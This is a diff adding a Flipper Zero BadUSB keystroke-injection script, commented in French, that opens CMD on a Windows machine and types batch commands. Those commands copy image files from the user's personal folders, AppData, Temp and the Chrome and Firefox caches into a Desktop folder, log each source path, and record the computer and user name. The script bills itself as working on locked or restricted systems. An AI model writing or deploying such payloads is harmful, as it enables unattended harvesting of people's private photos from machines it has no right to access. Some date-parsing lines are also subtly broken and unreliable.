@@ -1,0 +1,596 @@
+REM ================================================================
+REM Flipper Zero BadUSB - Extracteur d'Images Universel
+REM ================================================================
+REM Nom: Extraction Universelle (Universal Extract)
+REM Description: Extraction pure CMD/Batch compatible avec tous Windows
+REM Cible: Windows XP/Vista/7/8/10/11 (CMD natif uniquement)
+REM Auteur: Plume-Paopedia
+REM Version: 1.0
+REM Durée: 5-10 minutes (selon le nombre d'images)
+REM Privilèges: Utilisateur standard (pas d'admin requis)
+REM Compatibilité: 100% CMD/Batch - Aucune dépendance PowerShell
+REM ================================================================
+
+REM Délai standard pour compatibilité maximale
+DEFAULT_DELAY 400
+
+REM Ouverture CMD avec titre explicite
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+
+REM Configuration de l'environnement CMD pour extraction universelle
+STRING title Extracteur Universel d'Images - 100%% Compatible CMD
+ENTER
+DELAY 300
+STRING color 0F
+ENTER
+DELAY 200
+
+REM Création du dossier de destination avec horodatage
+STRING cd %USERPROFILE%\Desktop
+ENTER
+DELAY 400
+STRING for /f "tokens=1-3 delims=/ " %%a in ('%DATE%') do set DATESTR=%%c-%%a-%%b
+ENTER
+DELAY 200
+STRING for /f "tokens=1-2 delims=: " %%a in ('%TIME%') do set TIMESTR=%%a-%%b
+ENTER
+DELAY 200
+STRING set FOLDERNAME=Images_Extraction_Universelle_%DATESTR%_%TIMESTR%
+ENTER
+DELAY 200
+STRING mkdir "%FOLDERNAME%" >nul 2>&1
+ENTER
+DELAY 300
+STRING cd "%FOLDERNAME%"
+ENTER
+DELAY 400
+
+REM Affichage de l'en-tête d'extraction universelle
+STRING echo.
+ENTER
+STRING echo ===============================================================
+ENTER
+STRING echo               EXTRACTEUR UNIVERSEL D'IMAGES
+ENTER
+STRING echo                   Flipper Zero BadUSB
+ENTER
+STRING echo ===============================================================
+ENTER
+STRING echo.
+ENTER
+STRING echo [INFO] Mode de compatibilite maximale - CMD natif uniquement
+ENTER
+STRING echo [INFO] Compatible avec toutes les versions de Windows
+ENTER
+STRING echo [INFO] Aucune dependance PowerShell requise
+ENTER
+STRING echo.
+ENTER
+STRING echo Debut de l'extraction en cours...
+ENTER
+DELAY 1000
+
+REM Initialisation des compteurs avec fichiers temporaires
+STRING echo 0 > temp_count.txt
+ENTER
+STRING echo 0 > temp_size.txt
+ENTER
+STRING echo Extraction demarree le %DATE% a %TIME% > extraction_log.txt
+ENTER
+DELAY 300
+
+REM Phase 1: Extraction depuis le dossier Pictures
+STRING echo.
+ENTER
+STRING echo [PHASE 1] Extraction depuis Pictures...
+ENTER
+STRING if exist "%USERPROFILE%\Pictures" (
+ENTER
+DELAY 200
+STRING   echo [SCAN] Dossier Pictures trouve - Copie en cours...
+ENTER
+STRING   for /r "%USERPROFILE%\Pictures" %%F in (*.jpg *.jpeg *.png *.gif *.bmp) do (
+ENTER
+STRING     if exist "%%F" (
+ENTER
+STRING       copy "%%F" ".\Pic_%%~nxF" >nul 2>&1
+ENTER
+STRING       if not errorlevel 1 (
+ENTER
+STRING         echo [OK] %%~nxF copie
+ENTER
+STRING         echo %%F >> extraction_log.txt
+ENTER
+STRING       )
+ENTER
+STRING     )
+ENTER
+STRING   )
+ENTER
+STRING ) else (
+ENTER
+STRING   echo [WARNING] Dossier Pictures non accessible
+ENTER
+STRING )
+ENTER
+DELAY 400
+
+REM Phase 2: Extraction depuis Desktop
+STRING echo.
+ENTER
+STRING echo [PHASE 2] Extraction depuis Desktop...
+ENTER
+STRING for %%F in ("%USERPROFILE%\Desktop\*.jpg" "%USERPROFILE%\Desktop\*.jpeg" "%USERPROFILE%\Desktop\*.png" "%USERPROFILE%\Desktop\*.gif" "%USERPROFILE%\Desktop\*.bmp") do (
+ENTER
+STRING   if exist "%%F" (
+ENTER
+STRING     copy "%%F" ".\Desktop_%%~nxF" >nul 2>&1
+ENTER
+STRING     if not errorlevel 1 (
+ENTER
+STRING       echo [OK] %%~nxF copie depuis Desktop
+ENTER
+STRING       echo %%F >> extraction_log.txt
+ENTER
+STRING     )
+ENTER
+STRING   )
+ENTER
+STRING )
+ENTER
+DELAY 400
+
+REM Phase 3: Extraction depuis Documents avec sous-dossiers
+STRING echo.
+ENTER
+STRING echo [PHASE 3] Extraction depuis Documents...
+ENTER
+STRING if exist "%USERPROFILE%\Documents" (
+ENTER
+STRING   echo [SCAN] Analyse du dossier Documents...
+ENTER
+STRING   for /r "%USERPROFILE%\Documents" %%F in (*.jpg *.jpeg *.png *.gif *.bmp *.tiff *.webp) do (
+ENTER
+STRING     if exist "%%F" (
+ENTER
+STRING       copy "%%F" ".\Doc_%%~nxF" >nul 2>&1
+ENTER
+STRING       if not errorlevel 1 (
+ENTER
+STRING         echo [OK] %%~nxF extrait
+ENTER
+STRING         echo %%F >> extraction_log.txt
+ENTER
+STRING       )
+ENTER
+STRING     )
+ENTER
+STRING   )
+ENTER
+STRING ) else (
+ENTER
+STRING   echo [WARNING] Dossier Documents non accessible
+ENTER
+STRING )
+ENTER
+DELAY 400
+
+REM Phase 4: Extraction depuis Downloads
+STRING echo.
+ENTER
+STRING echo [PHASE 4] Extraction depuis Downloads...
+ENTER
+STRING if exist "%USERPROFILE%\Downloads" (
+ENTER
+STRING   echo [SCAN] Recherche dans Telechargements...
+ENTER
+STRING   for /r "%USERPROFILE%\Downloads" %%F in (*.jpg *.jpeg *.png *.gif *.bmp *.ico *.jfif) do (
+ENTER
+STRING     if exist "%%F" (
+ENTER
+STRING       copy "%%F" ".\DL_%%~nxF" >nul 2>&1
+ENTER
+STRING       if not errorlevel 1 (
+ENTER
+STRING         echo [OK] %%~nxF recupere
+ENTER
+STRING         echo %%F >> extraction_log.txt
+ENTER
+STRING       )
+ENTER
+STRING     )
+ENTER
+STRING   )
+ENTER
+STRING ) else (
+ENTER
+STRING   echo [WARNING] Dossier Downloads non accessible
+ENTER
+STRING )
+ENTER
+DELAY 400
+
+REM Phase 5: Extraction depuis autres emplacements courants
+STRING echo.
+ENTER
+STRING echo [PHASE 5] Scan des emplacements supplementaires...
+ENTER
+
+REM Dossier Videos pour images intégrées
+STRING if exist "%USERPROFILE%\Videos" (
+ENTER
+STRING   echo [SCAN] Verification du dossier Videos...
+ENTER
+STRING   for %%F in ("%USERPROFILE%\Videos\*.jpg" "%USERPROFILE%\Videos\*.png" "%USERPROFILE%\Videos\*.gif") do (
+ENTER
+STRING     if exist "%%F" (
+ENTER
+STRING       copy "%%F" ".\Vid_%%~nxF" >nul 2>&1
+ENTER
+STRING       if not errorlevel 1 echo [OK] %%~nxF trouve dans Videos
+ENTER
+STRING     )
+ENTER
+STRING   )
+ENTER
+STRING )
+ENTER
+DELAY 300
+
+REM Dossier OneDrive si présent
+STRING if exist "%USERPROFILE%\OneDrive" (
+ENTER
+STRING   echo [SCAN] Detection OneDrive...
+ENTER
+STRING   for /r "%USERPROFILE%\OneDrive" %%F in (*.jpg *.png *.jpeg) do (
+ENTER
+STRING     if exist "%%F" (
+ENTER
+STRING       copy "%%F" ".\OD_%%~nxF" >nul 2>&1
+ENTER
+STRING       if not errorlevel 1 echo [OK] %%~nxF extrait de OneDrive
+ENTER
+STRING     )
+ENTER
+STRING   )
+ENTER
+STRING )
+ENTER
+DELAY 300
+
+REM Recherche dans les dossiers système accessibles
+STRING echo [SCAN] Verification des dossiers utilisateur supplementaires...
+ENTER
+STRING if exist "%APPDATA%" (
+ENTER
+STRING   for %%F in ("%APPDATA%\*.jpg" "%APPDATA%\*.png" "%APPDATA%\*.gif") do (
+ENTER
+STRING     if exist "%%F" (
+ENTER
+STRING       copy "%%F" ".\App_%%~nxF" >nul 2>&1
+ENTER
+STRING       if not errorlevel 1 echo [OK] %%~nxF trouve dans AppData
+ENTER
+STRING     )
+ENTER
+STRING   )
+ENTER
+STRING )
+ENTER
+DELAY 400
+
+REM Phase 6: Recherche dans les dossiers temporaires
+STRING echo.
+ENTER
+STRING echo [PHASE 6] Nettoyage des fichiers temporaires avec images...
+ENTER
+STRING if exist "%TEMP%" (
+ENTER
+STRING   echo [SCAN] Analyse du dossier temporaire...
+ENTER
+STRING   for %%F in ("%TEMP%\*.jpg" "%TEMP%\*.png" "%TEMP%\*.gif" "%TEMP%\*.bmp") do (
+ENTER
+STRING     if exist "%%F" (
+ENTER
+STRING       copy "%%F" ".\Tmp_%%~nxF" >nul 2>&1  
+ENTER
+STRING       if not errorlevel 1 echo [OK] %%~nxF recupere du cache
+ENTER
+STRING     )
+ENTER
+STRING   )
+ENTER
+STRING )
+ENTER
+DELAY 400
+
+REM Phase 7: Tentative d'accès aux profils de navigateurs (basique)
+STRING echo.
+ENTER
+STRING echo [PHASE 7] Recherche basique dans les donnees navigateurs...
+ENTER
+
+REM Chrome basique
+STRING if exist "%LOCALAPPDATA%\Google" (
+ENTER
+STRING   echo [SCAN] Detection Chrome...
+ENTER
+STRING   for /r "%LOCALAPPDATA%\Google" %%F in (*.jpg *.png) do (
+ENTER
+STRING     if exist "%%F" (
+ENTER
+STRING       copy "%%F" ".\Chr_%%~nxF" >nul 2>&1
+ENTER
+STRING       if not errorlevel 1 echo [OK] Cache Chrome: %%~nxF
+ENTER
+STRING     )
+ENTER
+STRING   )
+ENTER
+STRING )
+ENTER
+DELAY 300
+
+REM Firefox basique
+STRING if exist "%APPDATA%\Mozilla" (
+ENTER
+STRING   echo [SCAN] Detection Firefox...
+ENTER
+STRING   for /r "%APPDATA%\Mozilla" %%F in (*.jpg *.png *.gif) do (
+ENTER
+STRING     if exist "%%F" (
+ENTER
+STRING       copy "%%F" ".\FF_%%~nxF" >nul 2>&1
+ENTER
+STRING       if not errorlevel 1 echo [OK] Cache Firefox: %%~nxF
+ENTER
+STRING     )
+ENTER
+STRING   )
+ENTER
+STRING )
+ENTER
+DELAY 400
+
+REM Comptage final des fichiers extraits
+STRING echo.
+ENTER
+STRING echo [FINALISATION] Comptage des resultats...
+ENTER
+DELAY 300
+STRING for /f %%i in ('dir /b *.* 2^>nul ^| find /c /v ""') do set FILECOUNT=%%i
+ENTER
+DELAY 200
+STRING set /a FILECOUNT=%FILECOUNT%-2
+ENTER
+DELAY 200
+
+REM Génération du rapport final en mode CMD
+STRING echo.
+ENTER
+STRING echo =============================================================== > RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo                RAPPORT D'EXTRACTION UNIVERSELLE >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo                      Mode CMD - 100%% Compatible >> RAPPORT_EXTRACTION_CMD.txt  
+ENTER
+STRING echo =============================================================== >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo. >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo Date d'extraction: %DATE% >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo Heure de debut: %TIME% >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo Ordinateur cible: %COMPUTERNAME% >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo Utilisateur: %USERNAME% >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo. >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo STATISTIQUES: >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • Images extraites: %FILECOUNT% fichiers >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • Mode utilise: CMD Universel (sans PowerShell) >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • Compatibilite: Windows XP/Vista/7/8/10/11 >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo. >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo EMPLACEMENTS SCANNES: >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • %USERPROFILE%\Pictures >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • %USERPROFILE%\Desktop >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • %USERPROFILE%\Documents >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • %USERPROFILE%\Downloads >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • %USERPROFILE%\Videos >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • %USERPROFILE%\OneDrive >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • %APPDATA% >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • %TEMP% >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • Caches navigateurs (Chrome, Firefox) >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo. >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo FORMATS SUPPORTES: >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • JPG/JPEG - Photos standards >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • PNG - Images avec transparence >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • GIF - Images animees >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • BMP - Bitmaps Windows >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • ICO - Icones >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • JFIF - Format JPEG alternatif >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • TIFF - Images haute qualite >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • WEBP - Format web moderne >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo. >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo PREFIXES DE FICHIERS: >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • Pic_ = Dossier Pictures >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • Desktop_ = Bureau >> RAPPORT_EXTRACTION_CMD.txt  
+ENTER
+STRING echo • Doc_ = Documents >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • DL_ = Downloads/Telechargements >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • Vid_ = Dossier Videos >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • OD_ = OneDrive >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • App_ = AppData >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • Tmp_ = Fichiers temporaires >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • Chr_ = Cache Google Chrome >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • FF_ = Cache Mozilla Firefox >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo. >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo AVANTAGES DE CE MODE: >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • Compatible avec toutes les versions Windows >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • Aucune dependance PowerShell >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • Fonctionne meme avec restrictions de securite >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • Methode la plus universelle et fiable >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo • Ideal pour systemes anciens ou verrouilles >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+STRING echo =============================================================== >> RAPPORT_EXTRACTION_CMD.txt
+ENTER
+DELAY 500
+
+REM Affichage du résumé final à l'écran
+STRING cls
+ENTER
+STRING echo.
+ENTER
+STRING echo ===============================================================
+ENTER
+STRING echo              EXTRACTION UNIVERSELLE TERMINEE !
+ENTER
+STRING echo ===============================================================
+ENTER
+STRING echo.
+ENTER
+STRING echo 🎯 RESULTATS DE L'EXTRACTION:
+ENTER  
+STRING echo    • Images extraites: %FILECOUNT% fichiers
+ENTER
+STRING echo    • Mode utilise: CMD Universel (100%% compatible)
+ENTER
+STRING echo    • Compatibilite: Toutes versions Windows
+ENTER
+STRING echo    • Aucune dependance requise
+ENTER
+STRING echo.
+ENTER
+STRING echo 📁 FICHIERS GENERES:
+ENTER
+STRING echo    • Images extraites avec prefixes informatifs
+ENTER
+STRING echo    • RAPPORT_EXTRACTION_CMD.txt - Rapport detaille
+ENTER
+STRING echo    • extraction_log.txt - Journal des operations
+ENTER
+STRING echo.
+ENTER
+STRING echo 🔍 PREFIXES DES FICHIERS:
+ENTER
+STRING echo    Pic_    = Pictures     ^|  Desktop_ = Bureau
+ENTER
+STRING echo    Doc_    = Documents    ^|  DL_      = Downloads  
+ENTER
+STRING echo    Vid_    = Videos       ^|  OD_      = OneDrive
+ENTER
+STRING echo    Tmp_    = Temporaire   ^|  Chr_     = Chrome
+ENTER
+STRING echo    App_    = AppData      ^|  FF_      = Firefox
+ENTER
+STRING echo.
+ENTER
+STRING echo 💡 AVANTAGES DE CETTE VERSION:
+ENTER
+STRING echo    ✓ Compatible Windows XP a Windows 11
+ENTER
+STRING echo    ✓ Aucun PowerShell ou .NET requis
+ENTER
+STRING echo    ✓ Fonctionne avec restrictions de securite
+ENTER
+STRING echo    ✓ Methode la plus universelle disponible
+ENTER
+STRING echo.
+ENTER
+STRING echo ===============================================================
+ENTER
+DELAY 1000
+
+REM Nettoyage des fichiers temporaires
+STRING del temp_count.txt >nul 2>&1
+ENTER
+STRING del temp_size.txt >nul 2>&1
+ENTER
+DELAY 200
+
+REM Ouverture du dossier de résultats
+STRING echo Ouverture du dossier de resultats...
+ENTER
+STRING explorer .
+ENTER
+DELAY 1000
+
+REM Message final avec instructions
+STRING echo.
+ENTER
+STRING echo ===============================================================
+ENTER
+STRING echo Extraction universelle terminee avec succes !
+ENTER
+STRING echo.
+ENTER
+STRING echo 📂 Verifiez le contenu du dossier ouvert
+ENTER
+STRING echo 📄 Consultez RAPPORT_EXTRACTION_CMD.txt pour tous les details
+ENTER
+STRING echo 🔍 Les prefixes des fichiers indiquent leur origine
+ENTER
+STRING echo.
+ENTER
+STRING echo Cette version CMD est compatible avec TOUS les Windows !
+ENTER
+STRING echo.  
+ENTER
+STRING echo Appuyez sur une touche pour fermer cette fenetre...
+ENTER
+STRING echo ===============================================================
+ENTER
+STRING pause >nul
+ENTER
+
+REM Fermeture propre
+STRING exit
+ENTER
